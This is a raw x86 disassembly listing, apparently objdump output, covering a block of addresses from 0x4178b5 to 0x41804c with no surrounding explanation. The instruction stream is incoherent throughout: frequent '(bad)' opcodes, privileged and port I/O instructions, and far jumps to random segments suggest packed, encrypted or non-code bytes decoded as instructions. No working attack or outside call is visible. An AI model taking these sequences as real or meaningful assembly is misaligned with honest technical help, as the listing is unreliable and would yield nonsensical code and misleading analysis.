  4178b5:	call   0xcabc:0x55aec80a
  4178bc:	pop    ss
  4178bd:	in     al,dx
  4178be:	retf   
  4178bf:	jmp    0x28fb:0x1e4b9467
  4178c6:	cdq    
  4178c7:	(bad)  
  4178c8:	arpl   WORD PTR [edi-0x544ca0ab],bp
  4178ce:	and    DWORD PTR [eax+0x6fc3cc17],0xffffff86
  4178d5:	pop    DWORD PTR [esi]
  4178d7:	daa    
  4178d8:	jb     0x417865
  4178da:	int    0x41
  4178dc:	sbb    BYTE PTR [ecx*4-0x4fbf2dab],0x25
  4178e4:	push   ss
  4178e5:	inc    ebx
  4178e6:	sahf   
  4178e7:	ss pop edi
  4178e9:	inc    esi
  4178ea:	icebp  
  4178eb:	or     BYTE PTR [ecx+0x51f67c30],bh
  4178f1:	push   ebx
  4178f2:	mov    edi,0xa90cac4
  4178f7:	and    eax,0xb8b0ba43
  4178fc:	mov    bh,0x3e
  4178fe:	adc    dh,BYTE PTR [edi+0x23c4e651]
  417904:	lahf   
  417905:	pop    ss
  417906:	repnz xchg ecx,eax
  417908:	repnz inc edx
  41790a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41790b:	ins    BYTE PTR es:[edi],dx
  41790c:	add    bh,BYTE PTR [eax+0x44]
  41790f:	int    0xb6
  417911:	mov    ds:0x53627d12,al
  417916:	fsubr  QWORD PTR [edx-0x30]
  417919:	add    ah,ch
  41791b:	add    al,0xf1
  41791d:	adc    BYTE PTR [eax],0xc0
  417920:	cmp    DWORD PTR [edx+0x7d],ebx
  417923:	cmp    ebp,0x3264067
  417929:	xor    ebp,ebp
  41792b:	frstpm(287 only) 
  41792d:	pop    edx
  41792e:	sbb    DWORD PTR [ebx+0x34],0xb451c475
  417935:	jnp    0x41799a
  417937:	push   cs
  417938:	mov    esp,0xa847877
  41793d:	daa    
  41793e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41793f:	xor    BYTE PTR [ebx-0x71],bh
  417942:	daa    
  417943:	cmc    
  417944:	popa   
  417945:	inc    ecx
  417946:	mov    ds:0x2d2a06dd,al
  41794b:	pop    ecx
  41794c:	jmp    0xe973:0xb67fba07
  417953:	xchg   ecx,eax
  417954:	jg     0x4179ba
  417956:	pop    ebx
  417957:	dec    ebx
  417958:	dec    ebx
  417959:	inc    ebx
  41795a:	cmp    al,0x8e
  41795c:	jns    0x41792e
  41795e:	scas   al,BYTE PTR es:[edi]
  41795f:	cld    
  417960:	adc    BYTE PTR [esp+eax*1-0x48],bh
  417964:	xor    BYTE PTR [eax+0x21ff6615],ch
  41796a:	int    0x72
  41796c:	xchg   edi,eax
  41796d:	pop    edx
  41796e:	push   esp
  41796f:	ja     0x41795f
  417971:	out    dx,eax
  417972:	fwait
  417973:	add    DWORD PTR cs:0x4909ce60,esi
  41797a:	ins    DWORD PTR es:[edi],dx
  41797b:	xchg   ecx,eax
  41797c:	mov    ah,BYTE PTR ds:[esi+0x70ba9fc6]
  417983:	sbb    dl,BYTE PTR [ecx]
  417985:	xor    al,0xf1
  417987:	(bad)  
  417988:	in     eax,dx
  417989:	jb     0x417944
  41798b:	jbe    0x4179a4
  41798d:	popa   
  41798e:	aaa    
  41798f:	mov    dl,BYTE PTR [eax+0x36]
  417992:	or     al,0xf4
  417994:	ins    BYTE PTR es:[edi],dx
  417995:	push   cs
  417996:	mov    ecx,0x59aca8ba
  41799b:	add    ebp,DWORD PTR [esi+0x55]
  41799e:	dec    ecx
  41799f:	xchg   esi,eax
  4179a0:	dec    esi
  4179a1:	mov    eax,ds:0x1e9cdd31
  4179a6:	sbb    BYTE PTR gs:[edi],dl
  4179a9:	ret    0xbc13
  4179ac:	jb     0x4179a9
  4179ae:	xor    dl,BYTE PTR cs:[ebx]
  4179b1:	push   0xffffffbd
  4179b3:	int    0x20
  4179b5:	push   es
  4179b6:	fdivp  st(1),st
  4179b8:	int3   
  4179b9:	call   0x77a90cc1
  4179be:	loop   0x4179be
  4179c0:	outs   dx,BYTE PTR ds:[esi]
  4179c1:	test   eax,0xdf37be16
  4179c6:	dec    ecx
  4179c7:	dec    ebp
  4179c8:	push   ss
  4179c9:	sub    DWORD PTR [esi],0x7e
  4179cc:	or     edi,DWORD PTR [eax]
  4179ce:	jae    0x4179ea
  4179d0:	pop    esp
  4179d1:	mov    ch,0x78
  4179d3:	ins    BYTE PTR es:[edi],dx
  4179d4:	xor    dh,BYTE PTR [ebp+0x57343042]
  4179da:	mov    gs,WORD PTR [edi+edi*4]
  4179dd:	dec    esi
  4179de:	stc    
  4179df:	cwde   
  4179e0:	xlat   BYTE PTR ds:[ebx]
  4179e1:	fs inc esp
  4179e3:	or     edi,ebx
  4179e5:	push   edx
  4179e6:	add    dh,dh
  4179e8:	mov    edi,0xf2d322f5
  4179ed:	dec    edi
  4179ee:	cmp    eax,esp
  4179f0:	fdiv   DWORD PTR [eax+0x4e]
  4179f3:	jecxz  0x4179e2
  4179f5:	subps  xmm2,XMMWORD PTR [ecx+ebx*8]
  4179f9:	retf   0xa711
  4179fc:	xchg   esi,eax
  4179fd:	jbe    0x4179cd
  4179ff:	(bad)  
  417a00:	xor    al,0xc5
  417a02:	jle    0x41799c
  417a04:	adc    BYTE PTR [edi],ch
  417a06:	jne    0x417a64
  417a08:	adc    eax,0x5e1ec902
  417a0d:	dec    ebx
  417a0e:	mov    eax,ds:0xe8323613
  417a13:	sub    DWORD PTR [ecx+0x6fa6f5a8],eax
  417a19:	mul    BYTE PTR [esi-0x30b48eb9]
  417a1f:	cdq    
  417a20:	mov    esp,0xc75e9cbe
  417a25:	lods   al,BYTE PTR ds:[esi]
  417a26:	scas   eax,DWORD PTR es:[edi]
  417a27:	cmp    al,0x54
  417a29:	pop    ecx
  417a2a:	dec    esp
  417a2b:	adc    cl,BYTE PTR [esi-0x14]
  417a2e:	mov    bh,0xee
  417a30:	sbb    BYTE PTR [edi],dh
  417a32:	aaa    
  417a33:	loopne 0x417aad
  417a35:	cmc    
  417a36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a37:	ins    BYTE PTR es:[edi],dx
  417a38:	clc    
  417a39:	adc    al,0x78
  417a3b:	ins    DWORD PTR es:[edi],dx
  417a3c:	popf   
  417a3d:	gs jb  0x417a0f
  417a40:	(bad)  
  417a41:	xor    DWORD PTR [eax],eax
  417a43:	mov    esi,0xb7a58166
  417a48:	xor    ecx,DWORD PTR [edx+ecx*1-0x4a66d9b6]
  417a4f:	ins    BYTE PTR es:[edi],dx
  417a50:	ja     0x417a87
  417a52:	out    0xfc,al
  417a54:	dec    esp
  417a55:	(bad)  
  417a57:	stc    
  417a58:	inc    esi
  417a59:	mov    bl,0x85
  417a5b:	cmp    eax,0x97aaf5d5
  417a60:	mov    ds:0x648826a0,al
  417a65:	jle    0x417add
  417a67:	sbb    ah,0x7b
  417a6a:	lock xchg edx,eax
  417a6c:	pusha  
  417a6d:	inc    edx
  417a6e:	scas   eax,DWORD PTR es:[edi]
  417a6f:	push   esp
  417a70:	mov    ah,0xb1
  417a72:	cmp    DWORD PTR [ebx],ebp
  417a74:	cmp    BYTE PTR [eax-0x5bf57a45],0x7f
  417a7b:	pop    ecx
  417a7c:	std    
  417a7d:	add    DWORD PTR [ebp-0x7cf5b4e1],eax
  417a83:	sbb    BYTE PTR [edx+0x51b6c42],bl
  417a89:	lea    edi,[ebx]
  417a8b:	aam    0x12
  417a8d:	cmp    ebp,DWORD PTR [ebx-0xe]
  417a90:	mov    cl,BYTE PTR [esi-0x27fafc3d]
  417a96:	sub    eax,DWORD PTR [esi-0x6fa584e7]
  417a9c:	(bad)  [ebx-0x2c]
  417a9f:	imul   ebp,DWORD PTR [esi-0x72dcba1],0x347a7888
  417aa9:	daa    
  417aaa:	out    dx,eax
  417aab:	adc    ecx,ecx
  417aad:	dec    eax
  417aae:	push   cs
  417aaf:	test   DWORD PTR [ebp-0x14],esi
  417ab2:	mov    bl,0x70
  417ab4:	push   edi
  417ab5:	lods   eax,DWORD PTR ds:[esi]
  417ab6:	push   0x3008549c
  417abb:	xchg   ch,dh
  417abd:	xchg   DWORD PTR [edx-0x33dd76b7],edx
  417ac3:	mov    ebp,0x5f4630fd
  417ac8:	sub    BYTE PTR [ecx+0x72],bl
  417acb:	jo     0x417b45
  417acd:	adc    DWORD PTR [edi+0x77fa6876],edi
  417ad3:	leave  
  417ad4:	sbb    DWORD PTR [esi],ecx
  417ad6:	inc    esp
  417ad7:	in     eax,0x52
  417ad9:	sub    DWORD PTR [esi],ebx
  417adb:	pop    edi
  417adc:	stc    
  417add:	mov    edi,0x9ec82a2
  417ae2:	dec    esp
  417ae3:	pop    ss
  417ae4:	mov    ebx,0xd18adbc4
  417ae9:	xchg   ebx,eax
  417aea:	leave  
  417aeb:	sbb    cl,bh
  417aed:	pop    esp
  417aee:	pop    ss
  417aef:	fdivr  DWORD PTR [esi+ecx*2-0x72]
  417af3:	push   ss
  417af4:	rcr    DWORD PTR [eax+eax*8-0x774d7850],cl
  417afb:	stos   DWORD PTR es:[edi],eax
  417afc:	xchg   esp,eax
  417afd:	mov    ds:0x75e405d7,al
  417b02:	mov    dh,0xab
  417b04:	cmp    BYTE PTR [edi+0x58],ah
  417b07:	ror    DWORD PTR [ecx-0x2b],0x4
  417b0b:	xor    ebx,DWORD PTR [edi-0x28]
  417b0e:	pop    ss
  417b0f:	pop    ebp
  417b10:	icebp  
  417b11:	pop    ds
  417b12:	mov    ds:0x8de14a9d,al
  417b17:	out    0xfd,al
  417b19:	inc    edx
  417b1a:	test   DWORD PTR [ebx+edx*4+0x2b379ada],esp
  417b21:	mov    dh,0x7f
  417b23:	jno    0x417ad1
  417b25:	lods   eax,DWORD PTR ds:[esi]
  417b26:	adc    al,0x4a
  417b28:	pop    eax
  417b29:	sahf   
  417b2a:	int3   
  417b2b:	into   
  417b2c:	scas   eax,DWORD PTR es:[edi]
  417b2d:	jg     0x417ac7
  417b2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b31:	mov    bh,0xc4
  417b33:	pop    edx
  417b34:	stc    
  417b35:	mov    bh,BYTE PTR [edi+0x4615890c]
  417b3b:	leave  
  417b3c:	fs stos BYTE PTR es:[edi],al
  417b3e:	stc    
  417b3f:	into   
  417b40:	popf   
  417b41:	adc    eax,0xafc666e3
  417b46:	call   0x25756884
  417b4b:	pop    ds
  417b4c:	push   eax
  417b4d:	pop    esp
  417b4e:	adc    DWORD PTR [esi],esp
  417b50:	lahf   
  417b51:	mov    edi,0x142f04df
  417b56:	pop    es
  417b57:	daa    
  417b58:	cmp    BYTE PTR [esi+0x21],bh
  417b5b:	push   ebp
  417b5c:	mov    ds:0x20907681,eax
  417b61:	jne    0x417bc4
  417b63:	hlt    
  417b64:	cld    
  417b65:	loopne 0x417b30
  417b67:	loope  0x417aff
  417b69:	addr16 int3 
  417b6b:	hlt    
  417b6c:	sbb    DWORD PTR [edi+0x23],0x79
  417b70:	cli    
  417b71:	mov    bh,0x80
  417b73:	sub    ecx,esp
  417b75:	mov    ds:0xbe5bf5a2,eax
  417b7a:	mov    ds:0x56872937,eax
  417b7f:	cs or  BYTE PTR gs:[ebx],cl
  417b83:	inc    edx
  417b84:	loop   0x417b32
  417b86:	lahf   
  417b87:	and    al,0xd1
  417b89:	int    0xc3
  417b8b:	sub    DWORD PTR [ecx-0x41eb2120],edx
  417b91:	xchg   BYTE PTR [edi],dl
  417b93:	or     al,0x3a
  417b95:	test   eax,0xc58c2af
  417b9a:	cmp    bh,bh
  417b9c:	and    eax,0xccae8dad
  417ba1:	lods   eax,DWORD PTR ds:[esi]
  417ba2:	leave  
  417ba3:	mov    al,ds:0x8de8e8a9
  417ba8:	ss (bad) 
  417bab:	stos   DWORD PTR es:[edi],eax
  417bac:	in     eax,0x76
  417bae:	push   ebx
  417baf:	dec    BYTE PTR [ecx+ebx*8-0x7fdcc16f]
  417bb6:	into   
  417bb7:	dec    edi
  417bb8:	(bad)  
  417bb9:	cmp    al,0x9c
  417bbb:	arpl   WORD PTR [ebp+0x64f4c0f1],bx
  417bc1:	rcr    ebp,0xb4
  417bc4:	(bad)  
  417bc6:	push   ecx
  417bc7:	out    0xfd,eax
  417bc9:	jb     0x417b65
  417bcb:	push   edx
  417bcc:	or     esp,DWORD PTR [edi]
  417bce:	xchg   esp,eax
  417bcf:	cmc    
  417bd0:	push   ecx
  417bd1:	pop    ecx
  417bd2:	cwde   
  417bd3:	or     dh,BYTE PTR [edi+0x7e806def]
  417bd9:	cwde   
  417bda:	xchg   ebp,eax
  417bdb:	es daa 
  417bdd:	stos   DWORD PTR es:[edi],eax
  417bde:	leave  
  417bdf:	fmul   st,st(0)
  417be1:	cmp    BYTE PTR [edx+0x77443ee9],bl
  417be7:	ror    bh,1
  417be9:	sbb    ebp,edi
  417beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bec:	sbb    ah,ah
  417bee:	jae    0x417bb7
  417bf0:	xor    BYTE PTR [esi+0x630388a3],dh
  417bf6:	sbb    eax,0x1ac331f3
  417bfb:	pop    esp
  417bfc:	or     al,0x1a
  417bfe:	stos   BYTE PTR es:[edi],al
  417bff:	das    
  417c00:	or     eax,0xb725aa6b
  417c05:	pop    ss
  417c06:	xchg   esp,eax
  417c07:	jl     0x417bb0
  417c09:	das    
  417c0a:	or     ebx,eax
  417c0c:	push   0x7b9fbd77
  417c11:	xchg   esi,eax
  417c12:	jle    0x417c25
  417c14:	jnp    0x417bc5
  417c16:	outs   dx,BYTE PTR ds:[esi]
  417c17:	shl    DWORD PTR [edx+0x1c],cl
  417c1a:	push   ds
  417c1b:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  417c1d:	xchg   ebx,eax
  417c1e:	mov    dl,0xe8
  417c20:	into   
  417c21:	lock jl 0x417bad
  417c24:	call   0xc0aa414b
  417c29:	sbb    dh,dh
  417c2b:	enter  0x44cc,0x20
  417c2f:	std    
  417c30:	popw   ds
  417c32:	in     al,dx
  417c33:	rol    ch,1
  417c35:	dec    edi
  417c36:	cmp    al,0x55
  417c38:	dec    edx
  417c39:	mov    DWORD PTR [eax+edi*1-0x19],0x9415e983
  417c41:	sar    BYTE PTR [esi],cl
  417c43:	xor    esi,DWORD PTR [esi]
  417c45:	fdivr  QWORD PTR [edi-0x4f]
  417c48:	scas   eax,DWORD PTR es:[edi]
  417c49:	pusha  
  417c4a:	xchg   esi,eax
  417c4b:	cmp    dl,BYTE PTR [ebx]
  417c4d:	loopne 0x417bf2
  417c4f:	in     eax,0xe8
  417c51:	cmp    edx,DWORD PTR [eax+0x34]
  417c54:	test   eax,0xb6277c02
  417c59:	fidivr DWORD PTR [ebx]
  417c5b:	jmp    0xe16c2832
  417c60:	lods   al,BYTE PTR ds:[esi]
  417c61:	jmp    0x214be61c
  417c66:	jmp    esp
  417c68:	std    
  417c69:	lods   eax,DWORD PTR ds:[esi]
  417c6a:	mov    esi,edi
  417c6c:	retf   
  417c6d:	out    0xf3,al
  417c6f:	sub    BYTE PTR [edi+0x6e],0xfa
  417c73:	mov    bh,BYTE PTR [eax+0x7e89c810]
  417c79:	(bad)  
  417c7a:	sti    
  417c7b:	add    ah,al
  417c7d:	and    edi,eax
  417c7f:	fisttp QWORD PTR [eax]
  417c81:	or     bl,BYTE PTR [eax]
  417c83:	sbb    DWORD PTR [eax+0x3d954bd],ebx
  417c89:	xchg   DWORD PTR [ebx-0x6ca94871],edi
  417c8f:	adc    al,0x43
  417c91:	jg     0x417c23
  417c93:	out    0x85,al
  417c95:	add    eax,0x9ac0e27
  417c9a:	and    al,0x5a
  417c9c:	cmp    eax,0x81c32223
  417ca1:	cmp    cl,BYTE PTR [eax+0x7bfa1b69]
  417ca7:	xor    ebp,DWORD PTR [ebp+eax*2+0x558eef9]
  417cae:	adc    ah,0x53
  417cb1:	mov    dl,0x44
  417cb3:	mov    bh,0x61
  417cb5:	popf   
  417cb6:	pusha  
  417cb7:	lock mov ds:0xb196931a,al
  417cbd:	or     DWORD PTR [esi],edi
  417cbf:	lds    ebx,FWORD PTR [edx+ecx*8]
  417cc2:	pop    ds
  417cc3:	shr    BYTE PTR [edx+0x1fea7ad4],cl
  417cc9:	std    
  417cca:	js     0x417cb2
  417ccc:	xor    BYTE PTR [ecx],ch
  417cce:	cmc    
  417ccf:	push   ebx
  417cd0:	mov    al,BYTE PTR [ecx+0x54]
  417cd3:	cmp    eax,0xbe241b66
  417cd8:	adc    bh,BYTE PTR [ebp-0x525a19f4]
  417cde:	add    eax,DWORD PTR [esi-0x33]
  417ce1:	out    dx,eax
  417ce2:	push   ecx
  417ce3:	sub    DWORD PTR [ecx],edx
  417ce5:	jmp    0xde39:0xd08ec27a
  417cec:	push   esi
  417ced:	xchg   esp,ecx
  417cef:	lea    ebp,[ebp+0x2cc18492]
  417cf5:	test   DWORD PTR [ebx-0x6dda45a1],ebp
  417cfb:	lock das 
  417cfd:	bound  edi,QWORD PTR [edi-0x57]
  417d00:	or     eax,0x1eb6d344
  417d05:	xor    BYTE PTR [ebx+ebp*4-0x44],0x28
  417d0a:	lahf   
  417d0b:	stc    
  417d0c:	mov    dh,0x4e
  417d0e:	cmp    eax,0x7899f52e
  417d13:	add    DWORD PTR [edi-0x795aa86],ebp
  417d19:	adc    esp,edx
  417d1b:	lds    eax,FWORD PTR [esi+ebp*2-0x2c]
  417d1f:	mov    esi,0x127726e3
  417d24:	pop    ds
  417d25:	sbb    bh,bh
  417d27:	scas   eax,DWORD PTR es:[edi]
  417d28:	xor    eax,0x3487125a
  417d2d:	in     eax,dx
  417d2e:	jmp    edi
  417d30:	aaa    
  417d31:	xchg   edx,eax
  417d32:	mov    edi,es
  417d34:	dec    eax
  417d35:	jo     0x417cde
  417d37:	sti    
  417d38:	dec    esi
  417d39:	lahf   
  417d3a:	mov    edi,0xd7cef6da
  417d3f:	push   ebx
  417d40:	out    0x5e,eax
  417d42:	stc    
  417d43:	pop    ds
  417d44:	or     BYTE PTR [eax-0x38],dh
  417d47:	jno    0x417d6c
  417d49:	ds icebp 
  417d4b:	sub    eax,DWORD PTR [esi+0xf]
  417d4e:	bound  esp,QWORD PTR [edx]
  417d50:	fwait
  417d51:	stos   DWORD PTR es:[edi],eax
  417d52:	xchg   DWORD PTR [ecx-0x4a33c736],ebp
  417d58:	fldenv [ecx+esi*4]
  417d5b:	scas   al,BYTE PTR es:[edi]
  417d5c:	cwde   
  417d5d:	pusha  
  417d5e:	bnd jne 0x417d59
  417d61:	xchg   edi,eax
  417d62:	test   eax,0xbd658225
  417d67:	(bad)  
  417d69:	lods   al,BYTE PTR ds:[esi]
  417d6a:	popf   
  417d6b:	mov    bl,0x67
  417d6d:	mov    eax,ds:0xc0408995
  417d72:	pop    ecx
  417d73:	jg     0x417d14
  417d75:	js     0x417deb
  417d77:	and    BYTE PTR [esp+eiz*8],dl
  417d7a:	pop    ebp
  417d7b:	mov    cl,0x79
  417d7d:	xchg   ecx,eax
  417d7e:	movhps xmm5,QWORD PTR ss:[esi-0x3c853803]
  417d86:	cli    
  417d87:	jnp    0x417d7b
  417d89:	mov    al,ah
  417d8b:	aam    0xab
  417d8d:	jecxz  0x417d2c
  417d8f:	cmp    eax,0xfd2d1fc2
  417d94:	fwait
  417d95:	xor    bh,bl
  417d97:	sub    ch,BYTE PTR [ebx-0x124b1661]
  417d9d:	mov    ah,0x39
  417d9f:	adc    bh,BYTE PTR [eax]
  417da1:	sbb    ah,cl
  417da3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417da4:	stos   BYTE PTR es:[edi],al
  417da5:	xchg   esi,eax
  417da6:	jmp    0xd108b4c0
  417dab:	test   DWORD PTR [edi-0x10],ecx
  417dae:	test   DWORD PTR [edi+edx*2-0x650a1d9],0xeee1d2e2
  417db9:	cmc    
  417dba:	stos   DWORD PTR es:[edi],eax
  417dbb:	fistp  QWORD PTR [ecx+0x38f61529]
  417dc1:	out    dx,al
  417dc2:	imul   DWORD PTR [esi+0xc]
  417dc5:	ins    DWORD PTR es:[edi],dx
  417dc6:	add    DWORD PTR [edi],ebp
  417dc8:	lods   eax,DWORD PTR ds:[esi]
  417dc9:	sbb    ah,BYTE PTR [ebp+0x10d75049]
  417dcf:	jns    0x417e01
  417dd1:	out    dx,eax
  417dd2:	out    dx,eax
  417dd3:	mov    ebp,0x164a76a8
  417dd8:	pop    ds
  417dd9:	in     al,0xd7
  417ddb:	xchg   ecx,eax
  417ddc:	fwait
  417ddd:	test   eax,0x2f5e85e4
  417de2:	xchg   esi,eax
  417de3:	ja     0x417e2f
  417de5:	jge    0x417e25
  417de7:	in     al,dx
  417de8:	mov    cl,0x97
  417dea:	stos   DWORD PTR es:[edi],eax
  417deb:	mov    bh,0xd5
  417ded:	dec    ebx
  417dee:	popa   
  417def:	ret    
  417df0:	stos   BYTE PTR es:[edi],al
  417df1:	fsubr  DWORD PTR [ebp-0x41c8de04]
  417df7:	rcl    DWORD PTR [ebp+0x66],0xd
  417dfb:	pop    ss
  417dfc:	jbe    0x417d9a
  417dfe:	push   0xebc3cbe3
  417e03:	jmp    0xf4b8:0x3c004151
  417e0a:	cmp    DWORD PTR [edi+0x13],esi
  417e0d:	lods   al,BYTE PTR ds:[esi]
  417e0e:	bound  ebx,QWORD PTR [ecx+edx*2+0x2e]
  417e12:	mov    edx,0xae61c2ce
  417e17:	aad    0x50
  417e19:	sub    al,0xf1
  417e1b:	sub    BYTE PTR [esi+0x47a402f7],ch
  417e21:	mov    ecx,0x2e4be777
  417e26:	xchg   edi,eax
  417e27:	int3   
  417e28:	cmp    al,0x6
  417e2a:	add    ebx,0x546144a6
  417e30:	sar    DWORD PTR [eax],0x8e
  417e33:	popf   
  417e34:	repz pop esi
  417e36:	mov    edi,DWORD PTR ds:0xb8ad0f34
  417e3c:	popf   
  417e3d:	ss (bad) 
  417e3f:	mov    ds:0x6ac15191,eax
  417e44:	ja     0x417df2
  417e46:	mov    al,ds:0xc0365e14
  417e4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e4c:	icebp  
  417e4d:	fs jbe 0x417e9b
  417e50:	mov    ch,0xa8
  417e52:	and    DWORD PTR [esi-0x32d4927f],esi
  417e58:	mov    esp,0xb5d4bf30
  417e5d:	add    esp,0x2a
  417e60:	lods   eax,DWORD PTR ds:[esi]
  417e61:	jmp    0xaba3cf39
  417e66:	mov    ch,0x5d
  417e68:	shrd   DWORD PTR [edi+0x65],edi,cl
  417e6c:	in     eax,dx
  417e6d:	pop    esp
  417e6e:	test   edi,edi
  417e70:	sbb    al,0xc
  417e72:	outs   dx,DWORD PTR ds:[esi]
  417e73:	gs add al,0x24
  417e76:	nop
  417e77:	pop    eax
  417e78:	leave  
  417e79:	cmp    al,0xc2
  417e7b:	(bad)  
  417e7c:	mov    eax,0x3595a4fc
  417e81:	sbb    ch,ch
  417e83:	pop    edx
  417e84:	js     0x417e47
  417e86:	pusha  
  417e87:	mov    ebp,0xc0089aff
  417e8c:	int    0xc7
  417e8e:	sbb    ecx,DWORD PTR [esi]
  417e90:	and    DWORD PTR [ebp+0x20],ebx
  417e93:	and    esp,DWORD PTR [edx+0x58daeed1]
  417e99:	mov    eax,ds:0x3fb37433
  417e9e:	jnp    0x417ed9
  417ea0:	xchg   esp,eax
  417ea1:	into   
  417ea2:	loopne 0x417e4b
  417ea4:	fdivr  st,st(5)
  417ea6:	shr    BYTE PTR [ecx+0x66],0x2e
  417eaa:	fdivp  st(3),st
  417eac:	xor    al,0xf8
  417eae:	int3   
  417eaf:	inc    edi
  417eb0:	aam    0x59
  417eb2:	std    
  417eb3:	ret    0x11fc
  417eb6:	test   al,0xc3
  417eb8:	sbb    al,0xf5
  417eba:	push   ecx
  417ebb:	ss jle 0x417ef9
  417ebe:	sbb    bl,dl
  417ec0:	in     al,dx
  417ec1:	mov    eax,ds:0x440a2ac6
  417ec6:	sub    eax,0xd0b620d2
  417ecb:	and    BYTE PTR ss:[ebx+0x6af498bb],cl
  417ed2:	pop    ecx
  417ed3:	mov    ds,WORD PTR [edi+esi*4]
  417ed6:	mov    ebx,eax
  417ed8:	and    eax,0x2bbe3371
  417edd:	ret    
  417ede:	mov    al,0xd3
  417ee0:	or     eax,0x2ef8513c
  417ee5:	push   es
  417ee6:	outs   dx,DWORD PTR ds:[esi]
  417ee7:	pop    ds
  417ee8:	lods   al,BYTE PTR ds:[esi]
  417ee9:	test   al,0xbc
  417eeb:	fild   QWORD PTR [ecx+0x79c4953b]
  417ef1:	add    eax,DWORD PTR [ecx]
  417ef3:	push   es
  417ef4:	inc    esp
  417ef5:	test   DWORD PTR [edi+0x2465f783],eax
  417efb:	iret   
  417efc:	popf   
  417efd:	daa    
  417efe:	cmp    eax,0x2b7068fc
  417f03:	out    0xbb,eax
  417f05:	jns    0x417f55
  417f07:	dec    eax
  417f08:	adc    al,0xe3
  417f0a:	inc    esi
  417f0b:	inc    ecx
  417f0c:	enter  0x199d,0xb2
  417f10:	mov    bh,0xfd
  417f12:	jmp    FWORD PTR [ebp+0x17286687]
  417f18:	xchg   ebp,eax
  417f19:	sbb    dh,BYTE PTR [edi]
  417f1b:	adc    BYTE PTR ds:[ecx],al
  417f1e:	push   0x3591efdb
  417f23:	arpl   WORD PTR [eax-0x903d297],dx
  417f29:	jne    0x417f8a
  417f2b:	ins    DWORD PTR es:[di],dx
  417f2d:	sub    al,0x33
  417f2f:	cld    
  417f30:	in     eax,dx
  417f31:	mov    ch,0x9a
  417f33:	inc    edi
  417f34:	stos   DWORD PTR es:[edi],eax
  417f35:	pop    esi
  417f36:	and    eax,0x5a12517a
  417f3b:	sub    al,0x30
  417f3d:	addr16 xchg al,bh
  417f40:	mov    bl,0x39
  417f42:	mov    edx,0xbe9aeef8
  417f47:	pop    ebp
  417f48:	(bad)  
  417f4a:	push   0xffffffca
  417f4c:	pop    ecx
  417f4d:	in     eax,0xc8
  417f4f:	mov    ch,bl
  417f51:	or     bh,BYTE PTR [edx]
  417f53:	jno    0x417eed
  417f55:	pop    ss
  417f56:	enter  0xfa9f,0xe
  417f5a:	retf   0x6988
  417f5d:	out    0xf2,eax
  417f5f:	data16 fmul QWORD PTR ds:0x5555da21
  417f66:	xchg   ecx,eax
  417f67:	loopne 0x417fc3
  417f69:	jo     0x417f48
  417f6b:	mov    ecx,0x75f431eb
  417f70:	sub    BYTE PTR [ecx+0x44e47aff],ch
  417f76:	jecxz  0x417f46
  417f78:	sbb    bh,al
  417f7a:	jbe    0x417f48
  417f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f7d:	push   ecx
  417f7e:	(bad)  
  417f7f:	lea    edx,[ecx+0x2d]
  417f82:	les    ebx,FWORD PTR [esi-0x5f]
  417f85:	sbb    bl,BYTE PTR [ecx]
  417f87:	retf   0x1884
  417f8a:	mov    ebx,0x8ac0e306
  417f8f:	in     al,0xd7
  417f91:	(bad)  
  417f92:	out    dx,al
  417f93:	mov    DWORD PTR [ecx+0x7a],eax
  417f96:	ror    DWORD PTR [eax],1
  417f98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f99:	cmp    al,0x36
  417f9b:	ds data16 jae 0x417f90
  417f9f:	inc    esp
  417fa0:	jecxz  0x417f7f
  417fa2:	fstp   TBYTE PTR [esi-0x27ae006c]
  417fa8:	mov    cl,0x73
  417faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fab:	and    BYTE PTR [ebx-0x705cda38],cl
  417fb1:	jp     0x417fb7
  417fb3:	xchg   edx,eax
  417fb4:	popa   
  417fb5:	cli    
  417fb6:	in     eax,0xaa
  417fb8:	out    0x88,al
  417fba:	mov    eax,0xb49be8e3
  417fbf:	push   edx
  417fc0:	adc    DWORD PTR [ebp-0x76],ebp
  417fc3:	into   
  417fc4:	repz dec ebp
  417fc6:	ss and eax,0x66832168
  417fcc:	mov    eax,ds:0xcd16703e
  417fd1:	into   
  417fd2:	xchg   ebp,eax
  417fd3:	push   cs
  417fd4:	mov    eax,ds:0xe1c53e30
  417fd9:	pop    eax
  417fda:	cmp    eax,0x4d088a7
  417fdf:	adc    al,0x91
  417fe1:	cwde   
  417fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fe3:	(bad)  
  417fe4:	xor    eax,0xda69237e
  417fe9:	sub    BYTE PTR [ebp+0x67320bd7],ch
  417fef:	jmp    0x398e:0x99cd18b3
  417ff6:	into   
  417ff7:	lahf   
  417ff8:	mov    WORD PTR [ecx-0x4df9ef02],cs
  417ffe:	clc    
  417fff:	adc    ecx,DWORD PTR ds:0xe2c830e
  418005:	bound  eax,QWORD PTR [ebx+ebx*8-0x2ea65f1b]
  41800c:	mov    dh,0x27
  41800e:	pop    edx
  41800f:	dec    esp
  418010:	dec    esp
  418011:	inc    esp
  418012:	arpl   WORD PTR [ecx+0x55],bx
  418015:	jg     0x418052
  418017:	clc    
  418018:	cmp    DWORD PTR [ebx+edx*8],ebp
  41801b:	and    dh,dl
  41801d:	xchg   bx,ax
  41801f:	and    DWORD PTR [edx+edx*2+0x37],ebp
  418023:	stos   DWORD PTR es:[edi],eax
  418024:	sub    al,0xeb
  418026:	mov    ecx,0xb9bd0284
  41802b:	lahf   
  41802c:	dec    ecx
  41802d:	sbb    bl,BYTE PTR [edi+0x7a03a77d]
  418033:	retf   0x95b5
  418036:	add    bh,BYTE PTR [ebx]
  418038:	int3   
  418039:	mov    eax,0x785213ba
  41803e:	xor    esi,DWORD PTR [ebx-0x64]
  418041:	(bad)  
  418042:	daa    
  418043:	inc    edx
  418044:	dec    ecx
  418045:	es gs jnp 0x417ff6
  418049:	pushf  
  41804a:	bswap  ebx
  41804c:	stos   DWORD PTR es:[edi],eax
